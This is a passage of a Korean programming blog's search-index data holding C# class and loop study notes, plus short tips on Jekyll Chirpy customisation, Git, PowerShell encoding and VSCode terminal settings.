요소를 초기화할 때 사용되는 생성자class Sample{ public static int value; static Sample() { value = 10; Console.WriteLine(&quot;정적 생성자 호출&quot;); }}정적 생성자를 만들 때는 제한이 있음 접근 제한자를 사용하지 못함 매개변수를 사용하지 못함 정적 생성자는 정적 요소를 사용할 때, 또는 인스턴스를 생성하는 초기 시점에 한 번만 호출됨 (해당 클래스와 관련된 요소를 처음 사용하는 시점에 자동적으로 호출되며, 별도로 호출 불가능)static void Main(string[] args){ Console.WriteLine(&quot;안녕!&quot;); Console.WriteLine(Sample.value); // 이 때 한 번만 호출됨! Console.WriteLine(&quot;반가워!&quot;); Sample sample = new Sample(); Console.WriteLine(&quot;잘 부탁해!&quot;);}static void Main(string[] args){ Console.WriteLine(&quot;안녕!&quot;); Sample sample = new Sample(); // 이 때 한 번만 호출됨! Console.WriteLine(&quot;반가워!&quot;); Console.WriteLine(Sample.value); Console.WriteLine(&quot;잘 부탁해!&quot;);} 소멸자생성자와 반대로 인스턴스가 소멸될 때 호출됨C#은 변수가 더 이상 사용되지 않을 것이 확실할 때 (주로 가비지 컬렉터가) 객체를 소멸시키며 소멸자를 호출함~클래스 이름() { }소멸자를 만들 때는 지켜야 할 규칙이 있음 이름은 클래스 이름 앞에 ~ 기호가 붙은 것이어야 함 접근 제한자를 사용하지 않음 반환과 관련된 선언을 하지 않음 매개변수과 관련된 선언을 하지 않음 하나의 클래스에는 하나의 소멸자만 있을 수 있음 class Program{ class Product { public string name; public int price; public Product(string name, int price) { this.name = name; this.price = price; } ~Product() { Console.WriteLine(this.name + &quot;의 소멸자 호출&quot;); } } static void Main(string[] args) { Product product = new Product(&quot;과자&quot;, 1500); }} 상수상수로 선언된 변수는 값을 변경할 수 없음값을 변경할 필요가 없거나, 값을 변경하는 것이 위험할 때 상수를 사용함상수를 생성하고 싶다면 변수 또는 속성 앞에 const 키워드를 붙여주면 됨class MyMath{ public const double PI = 3.141592;}const 키워드는 일반적인 메서드 내부에도 사용할 수 있음 (그런 경우가 많지는 않음) readonly 키워드읽기 전용 키워드 (상수와 크게 다를 바 없음)클래스 변수 또는 변수 앞에 readonly 키워드를 붙여서 생성함class Product{ private static int count; public readonly int id; public string name; public int price; public Product(string name, int price) { id = count++; // 생성자에서는 readonly 변수를 변경할 수 있음 this.name = name; this.price = price; }}readonly 변수는 변수를 선언하는 시점과 생성자 메서드에서만 값을 변경할 수 있음 캡슐화인스턴스 생성 시 검증class Box{ private int width; private int height; // 생성자 public Box(int width, int height) { if (width&amp;gt;0 || height&amp;gt;0) { this.width = width; this.height = height; } else { Console.WriteLine(&quot;너비와 높이는 자연수로 초기화해주세요!&quot;); } } // 인스턴스 메서드 public int Area() { return this.width * this.height; }}문제 → 한 번 생성한 width와 height 변경 불가, 어떤 값이 들어있는지도 확인 불가해결책 → 겟터와 셋터 겟터와 셋터변수를 바로 건드릴 수는 없지만 변수를 변경하는 메서드 호출을 통해 변경 가능class Box{ private int width; private int height; // 생성자 public Box(int width, int height) { if (width&amp;gt;0 || height&amp;gt;0) { this.width = width; this.height = height; } else { Console.WriteLine(&quot;너비와 높이는 자연수로 초기화해주세요!&quot;); } } // 인스턴스 메서드 public int Area() { return this.width * this.height; } // 겟터(Getter) public int GetWidth() { return width; } public int GetHeight() { return height; } // 셋터(Setter) public void SetWidth(int width) { if (width&amp;gt;0) { this.width = width; } else { Console.WriteLine(&quot;너비는 자연수를 입력해주세요&quot;); } } public void SetHeight(int width) { if (height&amp;gt;0) { this.height = height; } else { Console.WriteLine(&quot;높이는 자연수를 입력해주세요&quot;); } }}문제 → 코드가 너무 길어짐해결책 → 속성 속성겟터와 셋터를 손쉽게 만들 수 있는 방법생성 방법이 굉장히 다양하지만, 일반적으로는 아래와 같음private int 변수;public int 속성{ get { return 변수; } set { 변수 = value; }}다음과 같이 사용함인스턴스.속성 // 겟터 호출인스턴스.속성 = 값 // 셋터 호출SetWidth(int width) 의 매개변수와 같은 기능을 하는 것이 value 키워드임 일반적인 속성class Program{ class Box { // 변수와 속성 private int width; public int Width { get { return width; } set { if (value&amp;gt;0) { width = value; } else { Console.WriteLine(&quot;너비는 자연수를 입력해주세요&quot;); } } } private int height; public int Height { get { return height; } set { if (value&amp;gt;0) { height = value; } else { Console.WriteLine(&quot;높이는 자연수를 입력해주세요&quot;); } } } // 생성자 public Box(int width, int height) { Width = width; Height = height; } // 인스턴스 메서드 public int Area() { return this.width * this.height; } } static void Main(string[] args) { Box box = new Box(-10, -20); box.Width = -200; box.Height = -100; }} 간단한 속성 생성 방법public int Width { get; set; }public int Height { get; set; } 속성 코드 조각prop + tab 2회public int MyProperty { get; set; }propfull + tab 2회private int MyVar;public int MyProperty{ get { return myVar; } set { myVar = value; }} 재귀 메서드메서드 내부에서 자기 자신을 호출하는 메서드를 말함class Program{ static void Main(string[] args) { Main(new string[0]); }} 피보나치 수열재귀 메서드를 사용한 피보나치 인스턴스 메서드class Fibonacci{ public long Get(int i) { if (i&amp;lt;0) { return 0; } if (i==1) { return 1; } return Get(i-2) + Get(i-1); }}class Program{ static void Main(string[] args) { Fibonacci fibo = new Fibonacci(); Console.WriteLine(fibo.Get(1)); Console.WriteLine(fibo.Get(2)); Console.WriteLine(fibo.Get(3)); Console.WriteLine(fibo.Get(4)); Console.WriteLine(fibo.Get(5)); }}재귀 메서드를 사용한 피보나치 클래스 메서드class Fibonacci{ public static long Get(int i) { if (i&amp;lt;0) { return 0; } if (i==1) { return 1; } return Get(i-2) + Get(i-1); }}class Program{ static void Main(string[] args) { Console.WriteLine(Fibonacci.Get(1)); Console.WriteLine(Fibonacci.Get(2)); Console.WriteLine(Fibonacci.Get(3)); Console.WriteLine(Fibonacci.Get(4)); Console.WriteLine(Fibonacci.Get(5)); }} 메모화한 번 계산했던 값을 저장해두는 기술class Fibonacci{ private static Dictionary&amp;lt;int, long&amp;gt; memo = new Dictionary&amp;lt;int, long&amp;gt;(); public static long Get(int i) { if (i&amp;lt;0) { return 0; } if (i==1) { return 1; } if (memo.ContainsKey(i)) { return memo[i]; } else { long value = Get(i-2) + Get(i-1); memo[i] = value; return value; } }}class Program{ static void Main(string[] args) { Console.WriteLine(Fibonacci.Get(40)); Console.WriteLine(Fibonacci.Get(100)); }}memo 를 static 으로 선언하는 이유 → 클래스 메서드에서는 아직 메모리에 올라가지 않은 인스턴스 변수와 인스턴스 메서드를 사용할 수 없기 때문임" }, { "title": "namespace &amp; using", "url": "/posts/Csharp-namespace-using/", "categories": "Notes, C#", "tags": "", "date": "2022-03-02 17:00:00 +0900", "snippet": " namespace 일종의 스코프로, 큰 영역을 지정하는 키워드다. namespace는 유일한 이름을 가져야 한다. 다른 namespace의 클래스끼리는 이름이 같아도 상관 없다. (단, 이 경우 해당 namespace를 동시에 using 시키면 오류가 발생한다.) using 키워드를 이용하여 다른 namespace의 클래스를 가져와 사용할 수 있다. using 다른 namespace의 클래스를 가져와 사용할 때, 코드가 길어지는 것을 피할 수 있다. program.cs 맨 위에 using System; 을 적는 이유는, Console.WriteLine() 등 콘솔 상에 특정 작업을 하기 위해 사용하는 메서드들은 사실 System 이라는 namespace에서 가져오는 것이기 때문이다. using System; 을 적어주지 않는다면 System.Console.WriteLine() 라고 적어야 동일한 작업을 수행할 수 있는데, 이렇게 코드가 길어지는 것을 방지하기 위해 using 키워드가 존재한다. namespace의 특정 클래스를 가져오기 위해서는 static 한정자를 사용한다. using static System.Console; 이렇게 적어주면 WriteLine() 만 적어도 동일한 작업을 수행할 수 있다. " }, { "title": "C# 프로그래밍 - CH5 클래스", "url": "/posts/Csharp-ch5/", "categories": "Notes, C#", "tags": "", "date": "2022-03-02 15:00:00 +0900", "snippet": " 클래스클래스 = 사용자 정의 자료형class Car{ int carNumber; DateTime inTime; DateTime outTime; public void SetInTime() { this.inTime = DateTime.Now; } public void SetOutTime() { this.outTime = DateTime.Now; }}static void Main(string[] args){ Car car = new Car(); car.SetInTime(); car.SetOutTime();} 클래스와 인스턴스클래스 인스턴스 = new 생성자;Car car = new Car();클래스를 변수로 선언한 것을 인스턴스 또는 객체라고 부름또, 클래스 이름과 같은 메서드를 생성자라고 부름 클래스 사용이미 만들어져 있는 클래스들이 있음 (ex.Random,List,Math) Random 클래스Next() = 임의의 정수를 생성할 때 사용함Random random = new Random();Console.WriteLine(random.Next(10, 100));Console.WriteLine(random.Next(10, 100));Console.WriteLine(random.Next(10, 100));NextDouble() = 0.0~1.0 사이의 난수를 반환함Random random = new Random();Console.WriteLine(random.NextDouble());Console.WriteLine(random.NextDouble());Console.WriteLine(random.NextDouble());원하는 범위의 실수 난수 생성 (0.0~10.0)Random random = new Random();Console.WriteLine(random.NextDouble()*10);Console.WriteLine(random.NextDouble()*10);Console.WriteLine(random.NextDouble()*10); 인스턴스 멤버위에서와 같이 인스턴스 뒤에 점을 찍고 사용하는 멤버를 인스턴스 멤버라고 부름해당 멤버가 변수면 인스턴스 변수, 메서드면 인스턴스 메서드, 속성이면 인스턴스 속성 등으로 부름 List 클래스크기가 고정되어 있는 배열과 달리 List 클래스를 사용하면 가변적인 배열을 만들 수 있음List 클래스는 어떤 자료형의 리스트로 선언하는데, 이때 어떤 자료형인지를 알려주기 위해 Generic을 사용함 Generic클래스 이름 뒤에 &amp;lt; 와 &amp;gt; 로 감싸 적용함List&amp;lt;int&amp;gt; list = new List&amp;lt;int&amp;gt;(); 클래스 참조 추가Ctrl+. 를 눌러 참조를 추가할 수 있음 List 요소 추가Add()List&amp;lt;int&amp;gt; list = new List&amp;lt;int&amp;gt;();list.Add(1);list.Add(2);list.Add(3);foreach (var item in list){ Console.WriteLine(&quot;Total Count: &quot; + list.Count + &quot;\\tItem: &quot; + item);} List 인스턴스 생성과 동시에 요소 추가List&amp;lt;int&amp;gt; list = new List&amp;lt;int&amp;gt;() { 10, 20, 30 };foreach (var item in list){ Console.WriteLine(&quot;Total Count: &quot; + list.Count + &quot;\\tItem: &quot; + item);} List 요소 제거Remove() = 하나만 제거List&amp;lt;int&amp;gt; list = new List&amp;lt;int&amp;gt;() { 11, 22, 33 };list.Remove(22);foreach (var item in list){ Console.WriteLine(&quot;Total Count: &quot; + list.Count + &quot;\\tItem: &quot; + item);} Math 클래스인스턴스를 만들지 않고 사용함클래스 이름 뒤에 . 기호를 찍고 곧바로 멤버 사용Console.WriteLine(Math.Abs(-123));Abs(숫자) = 절댓값Ceiling(숫자) = 크거나 같은 최소 정수 (천장)Floor(숫자) = 작거나 같은 최대 정수 (바닥)Max(숫자, 숫자) = 둘 중 큰 수Min(숫자, 숫자) = 둘 중 작은 수Round(숫자) = 반올림 클래스 멤버(↔ 인스턴스 멤버)Math 클래스처럼 클래스 이름 뒤에 점을 찍고 바로 사용하는 멤버를 클래스 멤버라고 부름해당 멤버가 변수면 클래스 변수, 메서드면 클래스 메서드, 속성이면 클래스 속성 등으로 부름 클래스 생성using System;namespace ClassBasic{ class FirstClass { } class SecondClass { } class Program { static void Main(string[] args) { } }} 클래스 내부에 클래스 생성using System;namespace ClassBasic{ class Program { class FirstClass { } class SecondClass { } static void Main(string[] args) { } }} 서로 다른 파일에 클래스 생성클래스를 구현하다보면 길이가 어마어마해지기 때문에 파일 하나에 클래스를 넣고, 파일의 이름과 맞추어 만드는 것이 일반적임(파일의 이름과 클래스 이름이 다르다고 문제가 발생하지는 않음)기본 콘솔 이름 우클릭 추가 &amp;gt; 새 항목 클래스 &amp;gt; 원하는 클래스 이름 입력 빠른 생성 일단 Main() 메서드에 새로운 클래스 인스턴스 초기화 (Product product = new Product();) 오류가 발생하면 Ctrl+. &amp;gt; Product 형식 생성 &amp;gt; 새 파일에서 class Product 생성 namespace 간 클래스 이름이 충돌되지 않도록 특별한 목적이 없는 한 기존에 존재하는 클래스 이름과 다르게 선언할 것 인스턴스 변수접근 제한자 자료형 이름;class User{ public string name; public string password; public string address;}인스턴스 변수는 대부분 private 으로 선언하지만 지금은 접근 제한자를 배우지 않았으므로 일단 public 으로 선언함 인스턴스 변수 생성과 사용인스턴스 변수 생성class Program{ class Product { public string name; public int price; } static void Main(string[] args) { Product product = new Product(); }}인스턴스 변수 사용static void Main(string[] args){ Product product = new Product(); product.name = &quot;감자&quot;; product.price = 2000; Console.WriteLine(product.name + &quot; : &quot; + product.price + &quot;원&quot;);}인스턴스 변수 생성 시 초기화```csclass Product{ public string name = &quot;default&quot;; public int price = 1000;}인스턴스 생성 시 원하는 변수를 원하는 값으로 초기화 (일반적인 현대 프로그래밍 언어는 지원하지 않는 기능)class Product{ public string name; public int price;}static void Main(string[] args){ Product productA = new Product() { name=&quot;감자&quot;, price=2000 }; Product productB = new Product() { name=&quot;고구마&quot;, price=3000 };} 클래스 변수Math 클래스와 같이 클래스 이름으로 곧바로 사용하는 변수와 메서드를 클래스 변수와 클래스 메서드라고 부름클래스 변수를 만들 때는 static 키워드를 사용함접근 제한자 static 자료형 이름;class MyMath{ public static double PI = 3.141592;}static void Main(string[] args){ Console.WriteLine(MyMath.PI);} 클래스를 사용하는 이유일반적으로 클래스 기반의 객체 지향 프로그래밍 언어는 다음 네가지의 특징을 갖고 있음그리고 이 특징이 클래스를 사용하는 기본 이유임 추상화 캡슐화 상속 다형성 추상화프로그램에 사용되는 핵심적인 부분을 현실로부터 추출하는 것학생 = 학번, 이름, 학과 등class Student{ public string id; public string name; public string major;} 모델 클래스모델 클래스 = 변수만 갖고 있는 클래스실제 응용 프로그램 개발을 할 때 만들게 될 클래스의 90%가 이러한 모델 클래스임class Student{ public string id; public string name; public int grade; public string major; public DateTime birthday;} 모델 클래스와 List 클래스Student 클래스를 리스트(List 클래스의 인스턴스)에 저장하고 출력class Student{ public string name; public int grade;}static void Main(String[] args){ List&amp;lt;Student&amp;gt; list = new List&amp;lt;Student&amp;gt;(); list.Add(new Student() { name=&quot;염수경&quot;, grade=1 }); list.Add(new Student() { name=&quot;염수연&quot;, grade=2 }); list.Add(new Student() { name=&quot;염모찌&quot;, grade=3 }); foreach (var item in list) { Console.WriteLine(item.name + &quot; : &quot; + item.grade); }}리스트 생성 시 모델 클래스 동시 초기화List&amp;lt;Student&amp;gt; list = new List&amp;lt;Student&amp;gt;(){ new Student() { name=&quot;염수경&quot;, grade=1 }, new Student() { name=&quot;염수연&quot;, grade=2 }, new Student() { name=&quot;염정아&quot;, grade=3 }}; List 클래스 요소 제거와 역 반복문Remove(object element) = 객체를 지정하여 제거RemoveAt(int index) = 특정 인덱스를 지정하여 제거foreach 반복문 내부에서는 반복되고 있는 리스트에 추가 또는 제거가 불가능함즉, foreach 반복문을 사용해서는 요소 제거를 할 수 없음따라서 아래와 같은 코드에서는 오류가 발생함class Student{ public string name; public int grade;}static void Main(string[] args){ List&amp;lt;Student&amp;gt; list = new List&amp;lt;Student&amp;gt;(); list.Add(new Student() { name=&quot;피카츄&quot;, grade=1 }); list.Add(new Student() { name=&quot;꼬부기&quot;, grade=2 }); list.Add(new Student() { name=&quot;파이리&quot;, grade=3 }); foreach (var item in list) { if (item.grade &amp;gt; 1) { list.Remove(item); } } foreach (var item in list) { Console.WriteLine(item.name + &quot; : &quot; + item.grade); }}아래와 같이 for 반복문을 사용한다면?for (int i=0; i&amp;lt;list.Count; i++){ if (list[i].grade &amp;gt; 1) { list.RemoveAt(i); }}원하는 대로 되지 않음 → 요소가 지워지면서 인덱스가 앞으로 밀리기 때문따라서 하나 남은 역 for 반복문을 사용해야 함뒤에서부터 제거하면 다음 검사 대상인 인덱스가 앞으로 밀리는 일이 발생하지 않기 때문for (int i = list.Count-1; i&amp;gt;=0; i--){ if (list[i].grade &amp;gt; 1) { list.RemoveAt(i); }}리스트의 요소를 제거할 때는 반드시 역 for 반복문을 사용해야 함 partial 키워드partial 키워드를 사용하면 클래스를 분할하여 정의할 수 있음 (아예 다른 파일에서도 가능)partial class Example{ public int a;}partial class Example{ public int b;}" }, { "title": "C# 프로그래밍 - CH4 반복문", "url": "/posts/Csharp-ch4/", "categories": "Notes, C#", "tags": "", "date": "2022-03-01 23:00:00 +0900", "snippet": " 반복문 예시for (int i=0; i&amp;lt;1000; i++){ Console.WriteLine(i);} 배열배열 != 리스트int[] arr = { 1, 2, 3 };접근은 인덱스로 가능 arr[0] (단, 음수로 접근 불가)빈배열 생성 시 int[] arr = new int[100];이때, 숫자 자료형은 0, 문자열 자료형은 빈 문자열, 객체는 null로 초기화됨요소 개수 확인 시 Length 속성을 사용 arr.Length while문while (true){ Console.WriteLine(&quot;무한 반복&quot;);}int i = 0;int[] arr = { 10, 12, 15, 19, 21 };while (i &amp;lt; arr.Length){ Console.WriteLine(i + &quot;번째 출력:&quot; + arr[i]); i++;} do while문조건의 참 거짓 여부와 상관없이 내부의 문장을 최소 한 번은 실행함do{ Console.WriteLine(&quot;무한 반복&quot;);} while (true);string input;do{ Console.Write(&quot;입력(exit을 입력하면 종료): &quot;); input = Console.ReadLine();} while (input != &quot;exit&quot;); for문기본for (int i=0; i&amp;lt;1000; i++){ Console.WriteLine(i);}0부터 100까지 더하기int sum = 0;for (int i=1; i&amp;lt;101; i++){ sum += i;}Console.WriteLine(sum);1부터 20까지 곱하기long mul = 1;for (int i=1; i&amp;lt;21; i++){ mul *= i;}Console.WriteLine(mul);한글 전부 출력하기for (char i=&#39;가&#39;; i&amp;lt;=&#39;힣&#39;; i++){ Console.WriteLine(i);} 역 for문int[] arr = { 1, 2, 3, 4, 5, 6 };for (int i=arr.Length-1; i&amp;gt;=0; i--){ Console.WriteLine(arr[i]);} foreach문컬렉션에 쉽게 반복문을 적용할 때에 사용함 (ex.배열)string[] arr = { &quot;사과&quot;, &quot;오렌지&quot;, &quot;바나나&quot; };foreach (string item in arr){ Console.WriteLine(item);}var 키워드 사용 (더 일반적)string[] arr = { &quot;사과&quot;, &quot;오렌지&quot;, &quot;바나나&quot; };foreach (var item in arr){ Console.WriteLine(item);} 코드 조각if, while, for, foreach + tab 2회tab으로 키워드 간 이동하여 쉽게 수정 가능 중첩 반복문별 피라미드for (int i=1; i&amp;lt;11; i++){ for (int j=0; j&amp;lt;i; j++) { Console.Write(&#39;*&#39;); } Console.WriteLine();}역 별 피라미드for (int i=1; i&amp;lt;11; i++){ for (int k=0; k&amp;lt;10-i; k++) { Console.Write(&#39; &#39;); } for (int j=0; j&amp;lt;i; j++) { Console.Write(&#39;*&#39;); } Console.WriteLine();} break 키워드while (true){ Console.Write(&quot;숫자를 입력하세요(짝수를 입력하면 종료): &quot;); int input = int.Parse(Console.ReadLine()); if (input % 2 == 0) { break; }} goto 키워드지정한 레이블로 순간 이동함goto doNotUse; 이렇게 적으면 doNotUse: 부분으로 코드의 흐름이 즉시 이동한다고 생각하면 됨사용하지 말 것 continue 키워드홀수만 출력하기 (키워드O)for (int i=1; i&amp;lt;10; i++){ if (i%2==0) { continue; } Console.WriteLine(i);}홀수만 출력하기 (키워드X)for (int i=1; i&amp;lt;10; i++){ if (i%2!=0) { Console.WriteLine(i); }} 응용예제 - 문자열 처리C#의 모든 문자열 처리 메서드는 자신을 변경하지 않고 반환함무슨 소리냐면 input.ToUpper() 을 해도 input 자체는 변경되지 않는다는 뜻임이런 메서드를 비파괴적 메서드라고 부르기도 함 Split()문자열을 특정한 문자 또는 문자열 기준으로 자르고, 결과를 문자열 배열로 반환함매개변수로 char 배열을 넣을 수 있음 (여러 개의 문자를 입력하면 여러 문자를 기준으로 자를 수 있음)string input = &quot;모찌 정아 포뇨&quot;;string[] inputs = input.Split(new char[] { &#39; &#39; });foreach (var item in inputs){ Console.WriteLine(item);}여러 개의 문자 기준으로 자르기string input = &quot;하얀!모찌 까만!정아 빨간!포뇨&quot;;string[] inputs = input.Split(new char[] { &#39; &#39;, &#39;!&#39; });foreach (var item in inputs){ Console.WriteLine(item);} Trim()문자열 양 옆의 공백을 제거함string input = &quot; test \\n&quot;;Console.WriteLine(&quot;::&quot; + input.Trim() + &quot;::&quot;);TrimStart() = 문자열 앞의 공백 제거TrimEnd() = 문자열 뒤의 공백 제거 string.Join()배열에 있는 요소를 연결해서 문자열로 반환함string[] arr = { &quot;포카칩&quot;, &quot;에이스&quot;, &quot;초코비&quot; };Console.WriteLine(string.Join(&quot;,&quot;, arr)); 이동하는 달팽이Console.Clear() = 콘솔 화면을 지움Console.SetCursorPosition() = 콘솔 화면의 특정한 위치로 커서를 옮김Thread.Sleep() = 스레드 정지int x = 1;while (x&amp;lt;50){ Console.Clear(); Console.SetCursorPosition(x, 5); if (x%3==0) { Console.WriteLine(&quot;__@&quot;); } else if (x%3==1) { Console.WriteLine(&quot;_^@&quot;); } else { Console.WriteLine(&quot;^_@&quot;); } Thread.Sleep(100); x++;} 무한 반복하며 이동하기bool state = true;while (state){ ConsoleKeyInfo info = Console.ReadKey(); switch (info.Key) { case ConsoleKey.UpArrow: Console.WriteLine(&quot;위로 이동&quot;); break; case ConsoleKey.RightArrow: Console.WriteLine(&quot;오른쪽으로 이동&quot;); break; case ConsoleKey.DownArrow: Console.WriteLine(&quot;아래로 이동&quot;); break; case ConsoleKey.LeftArrow: Console.WriteLine(&quot;왼쪽으로 이동&quot;); break; case ConsoleKey.X: state = false; break; }} 무한 반복하여 이동하며 글자를 원하는 위치에 출력하기int x = 5;int y = 5;bool state = true;while (state){ Console.Clear(); Console.SetCursorPosition(x, y); Console.Write(&quot;@&quot;); ConsoleKeyInfo info = Console.ReadKey(); switch (info.Key) { case ConsoleKey.UpArrow: y -= 1; break; case ConsoleKey.RightArrow: x += 1; break; case ConsoleKey.DownArrow: y += 1; break; case ConsoleKey.LeftArrow: x -= 1; break; case ConsoleKey.X: state = false; break; }}" }, { "title": "Jekyll Chirpy 테마 - 최근 글 출력하기 | Chirpy 커스터마이징", "url": "/posts/Chirpy-recent-post/", "categories": "Project, Blog", "tags": "", "date": "2022-02-28 00:00:00 +0900", "snippet": "1. 계기순정 Chirpy의 오른쪽 컬럼에 있는 Recently Updated…은근 제대로 작동하지 않을 때가 많기도 하고 그다지 유용하지 않았다.그런고로 최근 글을 보여주게끔 바꿔주는게 좋겠다는 생각이 들었다.구현 방법은 정말 별 게 없지만 혹시나 필요한 사람에게는 도움이 될 수도 있을 것 같아 기록으로 남겨본다!2. 완성본Recent Post(클릭하면 더 크게 볼 수 있다!)다섯개는 너무 많은 것 같아서 최근 글 세개를 출력하게끔 바꿔주고 조금 꾸며줬다.이 포스팅은 추가적인 CSS에 대해서는 다루지 않는다.3. 적용 방법템플릿에 다음 코드를 추가한다._include &amp;gt; recent-list.html 을 생성하여 다음 코드를 복사 붙여넣기 해준다.&amp;lt;div id=&quot;access-lastmod&quot; class=&quot;post&quot;&amp;gt; &amp;lt;div class=&quot;panel-heading&quot;&amp;gt;&amp;lt;span style=&quot;color:#da8b8b&quot;&amp;gt;❤&amp;amp;ensp;&amp;lt;/span&amp;gt;Recent Post &amp;lt;/div&amp;gt; &amp;lt;ul class=&quot;post-content pl-0 pb-1 ml-1 mt-2&quot;&amp;gt; {% assign posts = site.posts | slice: 0, 3 %} {% for post in posts %} {% assign url = post.url | relative_url %} &amp;lt;li&amp;gt; &amp;lt;a href=&quot;{{ url }}&quot;&amp;gt;{{ post.title }}&amp;lt;/a&amp;gt; &amp;lt;/li&amp;gt; {% endfor %} &amp;lt;/ul&amp;gt;&amp;lt;/div&amp;gt;변경 후 저장한다!레이아웃에 들어간 템플릿을 교체해준다. (끝!)_layout &amp;gt; page.html 에 들어가 panel-wrapper 단락을 찾은 후 표시된 부분의 템플릿을 교체해준다. update-list.html → recent-list.html&amp;lt;div id=&quot;panel-wrapper&quot; class=&quot;col-xl-3 pl-2 text-muted&quot;&amp;gt; &amp;lt;div class=&quot;access&quot;&amp;gt; {% include recent-list.html %} // 여기! ... &amp;lt;/div&amp;gt;변경 후 저장하면 적용 성공이다!부연 설명참고로 위 코드는 포스트 제목 앞에 카테고리를 출력하지 않은 버전이다.카테고리 출력 시 상위 카테고리의 존재 여부에 따라 뽑아와야할 인덱스가 달라지므로 일률적인 코드를 제공하기가 어렵기 때문인데 이에 관한 설명을 조금 덧붙인다.서로 다른 두 가지의 상황에서 카테고리명은 각각 다음과 같이 인덱스에 배정된다. 상위 카테고리가 존재할 시 post.categories[0] = 상위 카테고리 post.categories[1] = 하위 카테고리 상위 카테고리가 존재하지 않을 시 post.categories[0] = 하위 카테고리 포스트 제목 앞에 카테고리를 짤막하게 출력하고 싶을 때는 아무래도 하위 카테고리를 뽑아오는 것이 사용자 경험 상 바람직한 선택인데, 위와 같이 경우에 따라 하위 카테고리의 인덱스가 달라지므로 모든 상황에서 하위 카테고리를 뽑아오려면 적절한 제어문을 작성해주어야 한다.liquid 문법 신경쓰랴 객체 찾으랴 재미는 있지만 사실 너무 귀찮은 작업이기 때문에 나는 그냥 모든 카테고리에 대해 상위 카테고리를 만들어준 후 categories[1] 을 공통적으로 출력해준 상태다.제어문 작성하는게 귀찮다면 그냥 나처럼 카테고리 계층을 통일해주는 식으로 간편하게 해결하고,모든 상황에 적용 가능한 코드를 짜보고 싶다면 아래 liquid 문법을 참고해보자. Liquid 문법 총 정리" }, { "title": "Codec &amp; Encoding", "url": "/posts/Notes-codec/", "categories": "Notes, Youtube", "tags": "", "date": "2022-02-25 00:00:00 +0900", "snippet": " 참고 유튜브 코덱이란?코덱 = Coder + Decoder비디오/오디오 저장 시 압축을 거쳐 저장됨압축 과정 = 인코딩 → 코더압축 풀기 = 디코딩 → 디코더 인코딩 : 파일을 압축, 변환하는 과정 디코딩 : 인코딩된 파일을 재생하는 과정 코더 : 파일을 인코딩해줌 디코더 : 파일을 디코딩해줌 인코딩된 파일에 맞는 디코더가 없다면 그 파일은 재생하지 못함 코덱 없을 때 해결 방법 컴퓨터에 있는 디코더에 맞게 파일을 변환 → 이게 편함! (트랜스코딩=인코딩) 파일에 맞는 디코더를 찾아 다운로드 압축된 파일을 필요한 형태로 바꾸는 것을 Transcoding(=Encoding)이라고 함" }, { "title": "HDD vs SSD", "url": "/posts/Notes-HDD-SSD/", "categories": "Notes, Youtube", "tags": "", "date": "2022-02-25 00:00:00 +0900", "snippet": " 참고 유튜브 디스크 전원이 차단되어도 정보를 손실하지 않는 비 휘발성 메모리 저장 장치 컴퓨터의 보조 기억장치 HDD vs SSD Hard Disk Drive vs Solid State DriveHDD = 플래터 : 장기간의 데이터 저장SSD = 반도체 (플래시메모리) → 더 작은 크기와 소음, 더 빠른 속도, 더 비싼 가격 : 실행 파일 메모리의 속도 정보를 읽고 쓰는 속도 빠르면 좋은 점은? 컴퓨터의 전반적인 속도가 빨라진다. (프로그램 실행 속도)" }, { "title": "32비트 vs 64비트", "url": "/posts/Notes-32bit-64bit/", "categories": "Notes, Youtube", "tags": "", "date": "2022-02-25 00:00:00 +0900", "snippet": " 참고 유튜브 32비트, 64비트라고 할 때의 비트란?32비트와 64비트 시스템에서 말하는 비트는 CPU 레지스터의 크기를 말한다.레지스터의 크기가 클수록 한번에 더 커다란 데이터를 처리할 수 있다. 레지스터란?CPU의 구조는 세 부분으로 나뉜다. 제어장치(Control Unit) 레지스터(Registers) 산술/논리연산장치(Arithmetic and Logic Unit = ALU)CPU안에서 데이터를 연산하기 위해CPU 내부에 데이터를 저장해 둘 공간이 필요하다 → 이 공간이 레지스터다!즉, 이 레지스터의 크기가 32비트냐 64비트냐의 차이다.32비트 → 2의 32승 = 4G (램 용량을 4G 이상 사용할 수 없음)64비트 → 2의 64승 x86, x64 아키텍처란?32비트시스템을 x86 아키텍처,64비트 시스템을 x64 아키텍처라고 부른다." }, { "title": "Gitignore 적용 전 캐시 삭제하기", "url": "/posts/Git-ignore/", "categories": "Tools, Git", "tags": "", "date": "2022-02-24 00:00:00 +0900", "snippet": " Gitignore 적용 전 캐시 삭제하기$ git rm -r --cached ." }, { "title": "Powershell 시스템에서 한글 인식하게끔 하기", "url": "/posts/Powershell-korean/", "categories": "Tools, Powershell", "tags": "", "date": "2022-02-23 18:00:00 +0900", "snippet": " 발단 $PROFILE에 바탕 화면으로 가는 alias를 생성했으나… 아래와 같이 한글이 깨지는 오류가 나는 상황이다. 해결 방법단순히 한글을 콘솔에 출력하는 문제가 아니라 시스템에서 한글을 인식할 수 있게끔 해주어야 하므로 해당 파일의 인코딩 형식을 바꿔주어야 한다. VSCode로 $PROFILE을 열어준다.$ code $PROFILE 최하단 상태바의 우측에 UTF-8이라고 적혀있는 것이 현재의 인코딩 형식이다. 해당 부분을 클릭한다. [인코딩하여 저장] 을 선택한다. [UTF-8 with BOM] 형식을 선택한다. 최하단 상태바의 인코딩 형식이 UTF-8 with BOM으로 바뀐 것을 확인할 수 있다. 확인 Powershell을 새로 연 후 alias를 입력해보면 정상적으로 작동한다." }, { "title": "VSCode 터미널 색 테마 커스터마이징", "url": "/posts/VSCode-terminal-color/", "categories": "Tools, VSCode", "tags": "", "date": "2022-02-23 00:00:00 +0900", "snippet": " VSCode 터미널 색 테마 커스터마이징 VSCode-base16-term 에 들어가 원하는 터미널 색 테마를 고른 후 Copy to clipboard를 누른다. VSCode로 돌아와 Ctrl+,을 눌러 설정으로 들어간 후 우측 상단의 버튼을 누르면 settings.json이 열린다. 복사한 내용을 settings.json에 다음의 형식으로 추가해준다.&quot;workbench.colorCustomizations&quot;: { # 이 부분에 붙여넣기!} 결과" }, { "title": "VSCode 터미널 시작 안내 문구 끄기", "url": "/posts/VSCode-nologo/", "categories": "Tools, VSCode", "tags": "", "date": "2022-02-23 00:00:00 +0900", "snippet": " VSCode 터미널 시작 안내 문구 끄기 Ctrl+,을 눌러 설정으로 들어간 후 우측 상단의 버튼을 누르면 settings.json이 열린다. settings.json에 다음 내용을 추가해준다.&quot;terminal.integrated.profiles.windows&quot;: { &quot;PowerShell&quot;: { &quot;source&quot;: &quot;PowerShell&quot;, &quot;icon&quot;: &quot;terminal-powershell&quot;, 